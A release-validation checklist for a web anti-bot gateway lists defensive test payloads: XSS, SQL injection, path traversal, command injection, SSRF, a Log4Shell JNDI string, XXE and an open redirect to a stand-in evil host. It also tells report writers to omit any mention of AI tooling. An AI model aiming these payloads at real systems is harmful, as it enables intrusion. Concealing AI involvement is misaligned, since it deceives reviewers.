# Rules of Engagement — AppSecGW build pipeline

These rules are non-optional. After every Docker build of
`appsec-antibot-gw:<version>`, run the full 15-step validation chain
below **before announcing the build as done**. Every finding must be
fixed (or explicitly classified as pre-existing in the report) before
the version is considered released.

Author: Pedro Tarrinho · Last updated for: 1.6.7

---

## 1. Unit tests
```
pytest tests/test_critical.py tests/test_pure.py tests/test_async.py -q
```
**Pass criterion:** 100 % green. Failures block the build.

## 2. Functional tests
```
pytest tests/test_functional.py -q
```
**Pass criterion:** 100 % green for new features in this version.
Pre-existing failures must be tagged as such in the report header.

## 3. Integration tests
```
pytest tests/test_integration.py -q
```
**Pass criterion:** 100 % green. Flaky tests that pass in isolation
should be flagged for investigation but do not block.

## 4. Sufficient logs
- Every detector path must emit a structured `event=request` line with a
  request id (`rid`) and a non-empty `reason` field.
- Admin endpoints log `event=config_changed` / `event=ban` / etc.
- Webhook events fire on every ban + every DLP hit.
- Manual review: `docker logs <container> | grep -E "reason='[^']+'"` —
  every detector must show up at least once during a black-box probe.

## 5. Regression tests
```
pytest tests/test_control_regressions.py tests/test_v14.py tests/test_v142.py -q
```
**Pass criterion:** Same set of pre-existing failures as last release
(no new regressions). Diff the failure list against the previous build.

## 6. Performance smoke
- Cold-start time (image launch → `[js-challenge] active`) **< 5 s**
- `/__metrics?key=…` p99 latency **< 50 ms**
- 1000-request burst against `/` does NOT trigger any false-positive ban
- Memory after 1 h soak **< 200 MB RSS**

## 7. Secret-leak scan
- `grep -nE '(BEGIN PRIVATE KEY|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9]{32}|ghp_[A-Za-z0-9]{36})' proxy.py dashboards/`
  must return **zero hits**.
- Live container responses must not contain `/data/.admin_key`,
  `SESSION_KEY`, `POW_HMAC_KEY`, or any env var value.
- DLP self-test: configure `DLP_ENABLED=1`, send a request that hits
  an upstream returning a known AKIA key — the gateway must record
  `dlp-aws` AND (when redact is on) replace it inline.

## 8. Injection sanitisation
At every input surface (URL path, query, body, headers, cookies):
- XSS: `<script>alert(1)</script>` — must NOT appear unescaped in any
  dashboard HTML response.
- SQLi: `' OR 1=1 --` — must fire `body-sqli` (POST) or `suspicious-path`
  (URL).
- LFI: `../../etc/passwd` — must fire `body-lfi` / `suspicious-path`.
- Command: `; whoami` — must fire `body-cmd`.
- SSRF: `http://169.254.169.254/` — must fire `body-ssrf`.
- Log4Shell: `${jndi:ldap://x/a}` — must fire `body-rce`.
- All admin endpoints must return 404 silent-decoy when an unauthorised
  IP probes them (no `admin-key` leak in headers / body).

## 9. Static hardening (Bandit)
```
bandit -ll proxy.py
```
**Pass criterion:** 0 High / 0 Critical. Mediums must each be classified
as confirmed false-positive in the report (B310 fixed-https / B104
intentional gateway binding / B608 numeric-controlled SQL are accepted).

## 10. Image CVE scan (Trivy)
```
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image --severity CRITICAL,HIGH,MEDIUM \
  --quiet appsec-antibot-gw:<version>
```
**Pass criterion:** 0 CRITICAL / 0 HIGH / 0 MEDIUM CVEs.

## 11. Secure code review
Read every line of code added or modified in this version. Check for:
- Hardcoded credentials / keys / tokens
- Unbounded loops / unbounded buffers (DoS amplifier)
- Missing input validation at trust boundaries
- Missing constant-time compares on auth paths
- Race conditions on shared mutable state (use `state_lock`)
- Logged secrets (admin key / session key / canary tokens / JWT contents)
- New external dependencies (must justify)
- New deps must be in `Dockerfile` AND `requirements.txt` if added

## 12. Black-box pentest
Spin a fresh harness on port 18443 with a tiny upstream stub. Probe
every NEW detector added in this version + the 6 generic OWASP probes
listed in §8. Document each probe with: request, expected reason, actual
reason, pass/fail. Tear the harness down when done.

## 13. Documentation
Each release MUST update:
0. **`validation/<version>.md`** — copy `validation/TEMPLATE.md` to
   `validation/<version>.md` (e.g. `validation/1.6.9.md`), fill in every
   step's actual result, counts, digests, and notes. This is the permanent
   per-release audit record. Add the new file to the `copy-to-github.sh`
   MANIFEST (uncomment / add the line in the "Validation records" block).
   The file is committed to git alongside the release commit so the audit
   trail is version-controlled. CHANGELOG.md carries only the one-line
   summary; the full evidence lives here.

1. **`CHANGELOG.md`** — add a new `## [<version>]` section at the top
   (below `[Unreleased]` if present) containing:
   - **Added** — every new feature, endpoint, knob, detector, or dashboard element.
   - **Changed** — every modified behaviour, weight adjustment, or renamed item.
   - **Fixed** — every bug fix, security finding resolution, or regression fix.
   - **Removed** — anything deleted or deprecated.
   - **Tests** — names of every new test added and the final pass count.
   - **Validation** — Bandit and Trivy summary (0 H / 0 C + Mediums classified).
   Move the current version's content out of `[Unreleased]` and stamp it with
   the release version tag. Features developed across multiple micro-iterations
   should be merged into a single version block — do not create entries per commit.

2. **`README.md`** — new row at the top of `Version history` table with
   the feature list, hot-reload knob count, risk-weight count, and the
   names of every new test added in this version. Also review and update:
   - Architecture diagram (middleware chain layers) if new layers were added.
   - "What it does" layer table if detection layers changed.
   - Configuration tables for any new env vars or knobs.
   - External-integration table for any new integrations.

3. **`MANUAL.md`** — operational runbook (start / stop / inspect logs /
   tune knobs / rotate keys / handle DLP redaction / tear down).
   Verify that every new knob, endpoint, and operational procedure introduced
   in this version is documented with an example command.

4. **`report.pdf`** — generated from `report.html` via Chromium headless
   (WeasyPrint v62.3 is broken on the build host):
   ```
   chromium --headless --no-sandbox --print-to-pdf=report.pdf \
     --print-to-pdf-no-header file:///abs/path/to/report.html
   ```
   Author: Pedro Tarrinho. Reports must NOT reference any AI tooling.

### 13a. Architecture + version consistency review
Before declaring documentation complete, verify:
- Version string in `proxy.py` (`AppSecGW_X.Y.Z`) matches the release tag.
- `README.md` image tag in Quick Start, multi-site fleet examples, and
  `Build from source` block all reference the new version.
- `Dockerfile` and `docker-compose.yml` default image tags updated if needed.
- `copy-to-github.sh` MANIFEST includes every new file added in this version.
- Architecture diagram in `README.md` reflects the actual middleware chain;
  add any new detection layer or admin endpoint introduced since last release.
- `CHANGELOG.md` `[Unreleased]` section is empty (or absent) after the
  release entry is stamped — nothing left undocumented.

---

## 14. Multi-arch build + Harbor push
Run only after steps 1–13 all pass (or pre-existing failures are classified).

### 14a. Disk space pre-check
```
df -h /var/lib/docker
```
**Pass criterion:** At least **10 GB free** before starting builds. Abort if less — prune
dangling images first:
```
docker image prune -f
```

### 14b. Build all three arches
```
# amd64 (primary — Chainguard distroless)
docker build --platform linux/amd64 -t appsec-antibot-gw:<version>-amd64 .

# arm64 (secondary — Chainguard distroless)
docker build --platform linux/arm64 -t appsec-antibot-gw:<version>-arm64 .

# armv7 (Debian slim — no Chainguard armv7 base)
docker build --platform linux/arm/v7 -f Dockerfile.armv7 \
  -t appsec-antibot-gw:<version>-armv7 .
```
**Pass criterion:** All three builds exit 0 with no layer errors.

### 14c. Tag and push to Harbor
Registry: `>harbor</antibotappsecgw/antibotappsecgw`
```
HARBOR=>harbor</antibotappsecgw/antibotappsecgw
VER=<version>

docker tag appsec-antibot-gw:${VER}-amd64 ${HARBOR}:${VER}-amd64
docker tag appsec-antibot-gw:${VER}-arm64 ${HARBOR}:${VER}-arm64
docker tag appsec-antibot-gw:${VER}-armv7 ${HARBOR}:${VER}-armv7

docker push ${HARBOR}:${VER}-amd64
docker push ${HARBOR}:${VER}-arm64
docker push ${HARBOR}:${VER}-armv7
```
**Pass criterion:** All three pushes succeed (digest printed per arch).

### 14d. Create and push manifest list
```
docker manifest create ${HARBOR}:${VER} \
  --amend ${HARBOR}:${VER}-amd64 \
  --amend ${HARBOR}:${VER}-arm64 \
  --amend ${HARBOR}:${VER}-armv7
docker manifest push ${HARBOR}:${VER}
```
**Pass criterion:** Manifest digest printed. Harbor shows the multi-arch tag in the UI.

---

## 15. Dynamic Security Testing
Run after step 12 (black-box pentest) on the same harness (port 18443 + upstream stub).
All five sub-steps must pass before the build is considered production-ready.

### 15a. TLS / HTTP Fingerprint Behavioural Analysis
Verify that the gateway collects and scores on transport-layer fingerprints.

**Setup — send requests with known fingerprint profiles:**
```bash
# JA3/JA4 — curl uses a well-known TLS fingerprint; capture with tshark
tshark -i lo -f "tcp port 18443" -T fields -e tls.handshake.random \
  -e tls.handshake.ciphersuite &
curl -sk https://127.0.0.1:18443/ -o /dev/null

# HTTP/2 fingerprint — send an h2 request with atypical SETTINGS frame order
curl -sk --http2 -H "User-Agent: python-httpx/0.27" \
  https://127.0.0.1:18443/ -o /dev/null

# Timing entropy — rapid low-entropy burst (bot-like inter-request timing)
for i in $(seq 1 50); do
  curl -sk https://127.0.0.1:18443/ -o /dev/null
done
```
**Pass criteria:**
- Gateway structured log contains `ja3` or `tls_fp` field on TLS-capable builds.
- HTTP/2 requests from known bot UA profiles score ≥ 1 on `http2-fp` or equivalent signal.
- 50-request burst within 2 s triggers `rate-burst` signal and increments risk score.
- Fingerprint data must NOT appear unredacted in any user-visible response body or header.

### 15b. Active DAST Probe (upstream app attack surface)
Gateway must detect and block common OWASP Top-10 payloads directed at the upstream.
Use the same 6 injection probes from §8 PLUS the additional vectors below.

**Additional DAST probes beyond §8:**
```bash
BASE=http://127.0.0.1:18443

# IDOR — predictable object reference
curl -sk "$BASE/api/users/1" -H "X-User-Id: 2"

# Broken object-level auth — access another user's resource
curl -sk "$BASE/api/orders/9999" -H "Authorization: Bearer $(cat /tmp/low_priv_token)"

# Mass assignment — extra fields in body
curl -sk -X POST "$BASE/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_superuser":true}'

# Path traversal variant (null byte)
curl -sk "$BASE/static/..%00/etc/passwd"

# XML injection / XXE
curl -sk -X POST "$BASE/api/upload" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'

# Open redirect
curl -sk "$BASE/redirect?url=https://evil.example.com" -L -v 2>&1 | grep "Location:"
```
**Pass criteria:**
- Every probe above is either blocked (≥ 40 risk → ban) or flagged in structured log with a
  non-empty `reason` field matching the attack class.
- No probe returns a 2xx with unmodified upstream data that exposes sensitive content.
- Open-redirect probe: `Location:` header must NOT point to `evil.example.com`.
- False-positive baseline: 20 clean requests after the probe run must all pass through
  without triggering a ban (score ≤ 3 per request).

### 15c. Adaptive Rate / Pattern Engine
Verify sliding-window anomaly detection responds to burst and low-and-slow patterns.

**Test matrix:**
```bash
BASE=http://127.0.0.1:18443

# 1. Burst attack — 200 requests in 5 s from single IP
ab -n 200 -c 20 -t 5 "$BASE/" 2>&1 | grep -E "^(Complete|Failed|Non-2xx)"

# 2. Low-and-slow — 1 req/s for 120 s from single IP (sustained scan pattern)
for i in $(seq 1 120); do
  curl -sk "$BASE/api/" -o /dev/null; sleep 1
done

# 3. Distributed burst — same burst but rotate across 5 IPs via X-Forwarded-For
#    (requires TRUST_XFF configured on harness)
for ip in 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4 10.0.0.5; do
  ab -n 40 -c 8 "$BASE/" -H "X-Forwarded-For: $ip" &
done; wait

# 4. Threshold auto-recovery — after ban expires (default TTL), confirm
#    clean requests pass again
sleep 65
curl -sk "$BASE/" -w "%{http_code}\n" -o /dev/null
```
**Pass criteria:**
- Burst (200 req / 5 s): IP banned within 10 s of first request, returns 429/403 for ≥ 90 % of
  remaining requests in burst.
- Low-and-slow: risk score increases monotonically; IP reaches soft-challenge threshold
  (default 4) within 60 req; JS challenge issued by req 60–80.
- Distributed burst: global rate counter increments; if `REDIS_URL` set, bans propagate to
  mesh peers within 5 s (verify via `redis-cli KEYS "ban:*"`).
- Auto-recovery: clean request after TTL returns 200 (not banned).

### 15d. Dashboard Test Console (synthetic request simulation)
Verify the controls dashboard can classify synthetic requests and display results.

**Manual test procedure (browser):**
1. Open `/__controls` — navigate to "Test Console" panel (or equivalent scoring simulator).
2. Enter a test request profile: IP = `1.2.3.4`, UA = `python-requests/2.31`, path = `/admin`.
3. Submit — verify the response panel shows:
   - Individual signal scores (e.g. `suspicious-ua: +3`, `suspicious-path: +4`).
   - Total risk score and classification (allow / soft-challenge / hard-challenge / ban).
   - Estimated latency cost (ms) per signal.
4. Repeat with a clean profile: IP = `8.8.8.8`, UA = `Mozilla/5.0 (Windows NT 10.0; Win64; x64)`,
   path = `/index.html` — must classify as allow (score ≤ 3).
5. Verify console requests do NOT hit the upstream (stub must receive zero new requests during test).

**Automated smoke:**
```bash
# POST to the scoring dry-run endpoint (if exposed)
curl -sk -X POST "http://127.0.0.1:18443/antibot-appsec-gateway/score-preview" \
  -H "X-Admin-Key: $(cat /data/.admin_key)" \
  -H "Content-Type: application/json" \
  -d '{"ip":"1.2.3.4","ua":"python-requests/2.31","path":"/admin"}' | jq .
```
**Pass criteria:**
- Dashboard panel renders without JS errors in browser console.
- Dry-run response contains `signals`, `total_score`, and `verdict` keys.
- Clean-profile score ≤ 3; bot-profile score ≥ 7.
- Upstream stub receives exactly 0 requests during dry-run calls.

### 15e. Honeypot / Canary Token Injection
Verify that secret tokens injected into HTML responses trigger alerts when re-requested.

**Setup:**
```bash
# Enable canary injection (if behind a feature knob)
curl -sk -X POST "http://127.0.0.1:18443/antibot-appsec-gateway/config" \
  -H "X-Admin-Key: $(cat /data/.admin_key)" \
  -d '{"CANARY_ENABLED":"1"}'

# 1. Fetch a page — gateway should inject a hidden canary token in HTML
CANARY=$(curl -sk "http://127.0.0.1:18443/" | grep -oP '(?<=canary=)[A-Za-z0-9._-]+')
echo "Captured canary: $CANARY"

# 2. Re-request the canary URL (simulates a scraper following a harvested link)
curl -sk "http://127.0.0.1:18443/honeypot?canary=$CANARY" -w "%{http_code}\n"

# 3. Verify ban was recorded
curl -sk "http://127.0.0.1:18443/antibot-appsec-gateway/bans" \
  -H "X-Admin-Key: $(cat /data/.admin_key)" | jq '.[] | select(.reason=="canary-hit")'
```
**Pass criteria:**
- Canary token is present in HTML source and is NOT human-visible (hidden link, CSS `display:none`,
  or zero-pixel image).
- Canary token is cryptographically signed (HMAC-SHA256 or equivalent) — tampering must fail.
- Re-requesting the canary URL within 60 s causes the source IP to be banned with
  `reason=canary-hit` in structured log and bans API.
- Canary tokens must be unique per session (two fetches produce different tokens).
- Canary tokens must NOT appear in any admin-visible key fields, metrics output, or error pages.

---

## Findings policy
**Fix before declaring the build done.** Pre-existing failures (e.g.
the JS-challenge HTML tests broken since 1.5.4 risk-gating Turnstile)
are classified at the top of the report — never silently inherited.

## Release announcement template
```
**1.6.<n> released — appsec-antibot-gw:1.6.<n>**
- Tests:         X unit + Y functional + Z regression — N/N pass
- Bandit:        0 High / 0 Critical · M Mediums (all confirmed FP)
- Trivy:         0 Critical / 0 High / 0 Medium CVEs
- Pentest:       N probes, 0 bypasses
- Disk free:     X GB before build
- Harbor:        amd64 ✓ · arm64 ✓ · armv7 ✓ · manifest ✓
- Pre-existing failures: <list or "none">
```
